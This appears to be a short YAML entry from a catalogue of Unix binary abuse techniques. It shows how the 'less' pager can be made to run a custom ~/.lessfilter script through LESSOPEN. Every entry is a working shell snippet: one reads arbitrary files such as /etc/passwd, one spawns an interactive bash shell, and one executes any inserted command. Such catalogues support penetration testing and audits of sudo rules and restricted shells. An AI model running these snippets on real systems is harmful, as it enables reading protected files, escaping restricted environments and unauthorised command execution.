---
functions:
  file-read:
    - description: |
        This can read arbitrary files by creating a custom lessfilter script.
      code: |
        echo '#!/bin/bash
        cat "$1"
        exit 0' > ~/.lessfilter
        chmod +x ~/.lessfilter
        export LESSOPEN="|~/.lessfilter %s"
        less /etc/passwd
  
  shell:
    - description: |
        This can spawn an interactive shell by executing commands through lessfilter.
      code: |
        echo '#!/bin/bash
        /bin/bash
        exit 0' > ~/.lessfilter
        chmod +x ~/.lessfilter
        export LESSOPEN="|~/.lessfilter %s"
        less anyfile

  command:
    - description: |
        This executes arbitrary commands through the lessfilter mechanism.
      code: |
        echo '#!/bin/bash
        COMMAND
        exit 0' > ~/.lessfilter
        chmod +x ~/.lessfilter
        export LESSOPEN="|~/.lessfilter %s"
        less anyfile
---
